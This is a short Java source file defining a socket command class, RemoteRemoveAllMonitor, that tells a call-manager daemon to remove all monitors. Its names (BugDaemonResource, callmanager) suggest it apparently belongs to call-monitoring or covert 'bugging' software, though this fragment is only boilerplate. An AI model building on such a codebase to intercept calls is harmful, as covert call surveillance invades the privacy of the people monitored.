package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;

public class RemoteRemoveAllMonitor extends SocketCmd<String, Boolean>{

	private static final long serialVersionUID = -4037318463895982559L;
	
	private static final String TAG = "RemoteRemoveAllMonitor";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteRemoveAllMonitor(String ownerPackage) {
		super(ownerPackage, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}
	
}
